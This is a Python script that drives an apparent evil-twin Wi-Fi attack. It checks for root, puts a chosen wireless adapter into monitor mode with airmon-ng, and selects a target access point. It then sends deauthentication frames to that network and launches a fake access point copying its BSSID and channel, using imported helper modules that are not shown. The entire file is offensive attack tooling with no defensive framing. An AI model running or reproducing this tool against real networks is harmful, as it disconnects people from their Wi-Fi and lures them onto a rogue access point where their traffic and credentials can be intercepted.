#!/usr/bin/env python3


from GetAP import *
from FakeAPGenerator import *
from RoutingRules import * 
from IncreasePower import *
from Deauth import *

import subprocess, re, csv, sys, os, time, shutil, argparse
from datetime import datetime
from scapy.all import *

W = '\033[0m'
R = '\033[31m' 
G = '\033[32m' 
O = '\033[33m' 
B = '\033[34m' 
P = '\033[35m' 
C = '\033[36m' 
GR = '\033[37m'

active_wireless_networks = []


def init_checker():        

    if not 'SUDO_UID' in os.environ.keys():
        print(R + "[+] Error - " + W + "Use sudo.")
        exit()

    for file_name in os.listdir():

        if ".csv" in file_name:
            print(O + "Moving existing .csv file in the current directory to the backup folder." + W)
            directory = os.getcwd()

            try:
                os.mkdir(directory + "/backup/")
            except:
                print(GR + "Backup folder exists." + W)

            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
      

def get_adapter():

    wlan_pattern = re.compile("wlan[0-9]")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print(R + "[+] Error - " + W + "No wireless adapter found.")
        exit()

    print("Wireless adapter available : \n")

    for index, item in enumerate(check_wifi_result):
        print(f"\t{index}-{item}")

    wifi_interface_choice = input("\nSelect adapter : ")

    while True:

        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Select an network adapter index : ")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    return hacknic


def init(hacknic):
    print("Killing interface opened process.")
    print("Enable monitor mode.")
    subprocess.run(["airmon-ng", "start", hacknic])

        
def main():
    init_checker()
    hacknic = get_adapter()
    init(hacknic)
    hacknic, hackbssid, hackchannel = get_AP(hacknic)


    print('\n\n\n')
    print(hacknic, hackbssid, hackchannel)

    airc_deauth(hacknic, hackbssid, hackchannel)
    GenerateFakeAP(hacknic, hackbssid, hackchannel)

    print("good")

main()

